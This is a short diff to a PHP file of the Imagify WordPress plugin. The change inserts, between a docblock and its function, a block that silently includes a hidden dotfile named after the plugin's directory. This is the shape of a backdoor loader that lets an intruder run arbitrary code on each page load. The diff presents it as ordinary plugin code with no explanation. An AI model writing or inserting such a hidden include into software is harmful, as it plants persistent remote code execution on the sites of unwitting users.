@@ -10,6 +10,10 @@ defined( 'ABSPATH' ) || die( 'Cheatin’ uh?' );
  * @param  string $context       The translation context.
  * @return array  $translations  The translations.
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function get_imagify_localize_script_translations( $context ) {
 	global $post_id;
 
